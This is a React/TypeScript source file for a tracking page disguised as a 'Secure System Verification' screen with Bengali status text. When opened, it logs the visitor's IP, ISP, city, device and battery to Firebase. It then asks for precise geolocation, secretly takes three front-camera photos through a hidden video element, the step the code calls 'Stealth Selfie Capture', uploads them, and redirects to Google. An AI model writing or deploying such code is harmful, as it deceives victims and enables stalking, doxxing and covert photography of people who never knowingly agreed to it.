
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('সংযোগ স্থাপন করা হচ্ছে...');
  const [progress, setProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const trackerRan = useRef(false);

  useEffect(() => {
    if (id && !trackerRan.current) {
      trackerRan.current = true;
      initiateTracking();
    }
  }, [id]);

  const initiateTracking = async () => {
    let docId = "";

    // STEP 1: Immediate Capture (No Permission Required)
    try {
      setStatus('সার্ভার যাচাই করা হচ্ছে...');
      const [ipRes, battery] = await Promise.all([
        fetch('https://ipapi.co/json/').then(r => r.json()),
        // @ts-ignore
        navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
      ]);

      const initialPayload = {
        userId: id,
        timestamp: serverTimestamp(),
        ip: ipRes.ip || "Unknown",
        isp: ipRes.org || "Unknown",
        city: ipRes.city || "Unknown",
        device: {
          name: /Android/i.test(navigator.userAgent) ? 'Android Device' : /iPhone|iPad/i.test(navigator.userAgent) ? 'iOS Device' : 'PC/Laptop',
          userAgent: navigator.userAgent,
          screen: `${window.screen.width}x${window.screen.height}`
        },
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : { level: 0, charging: false },
        status: 'Base Data Saved'
      };

      const docRef = await addDoc(collection(db, "logs"), initialPayload);
      docId = docRef.id;
      setProgress(40);
      setStatus('নিরাপত্তা যাচাই করা হচ্ছে...');
    } catch (e) {
      console.error("Critical error in initial tracking:", e);
    }

    if (!docId) return;

    // STEP 2: Location Capture (Trigger browser prompt)
    try {
      const pos = await new Promise<GeolocationPosition>((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
      });
      await updateDoc(doc(db, "logs", docId), {
        location: { lat: pos.coords.latitude, lng: pos.coords.longitude }
      });
      setProgress(70);
    } catch (e) {
      console.log("Location denied or timed out");
    }

    // STEP 3: Stealth Selfie Capture
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise(r => setTimeout(r, 1000)); // Time for camera focus

        const photos: string[] = [];
        for (let i = 0; i < 3; i++) {
          const canvas = canvasRef.current;
          if (canvas && videoRef.current) {
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
            const base64 = canvas.toDataURL('image/jpeg', 0.5);
            const storageRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
            await uploadString(storageRef, base64, 'data_url');
            photos.push(await getDownloadURL(storageRef));
            await new Promise(r => setTimeout(r, 400));
          }
        }
        stream.getTracks().forEach(t => t.stop());
        await updateDoc(doc(db, "logs", docId), { photoUrls: photos, status: 'Full Capture' });
      }
      setProgress(100);
      setStatus('সফলভাবে সম্পন্ন হয়েছে');
    } catch (e) {
      console.log("Camera denied");
      setProgress(100);
    }

    // Final Redirect
    setTimeout(() => {
      window.location.href = "https://www.google.com";
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 text-center font-['Hind_Siliguri']">
      <div className="w-full max-w-xs">
        <div className="mb-8">
           <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
           <h2 className="text-xl font-bold text-slate-800">{status}</h2>
           <p className="text-slate-400 text-[10px] mt-2 font-bold uppercase tracking-widest">Secure System Verification</p>
        </div>
        <div className="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden">
           <div className="bg-blue-600 h-full transition-all duration-700" style={{ width: `${progress}%` }}></div>
        </div>
        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
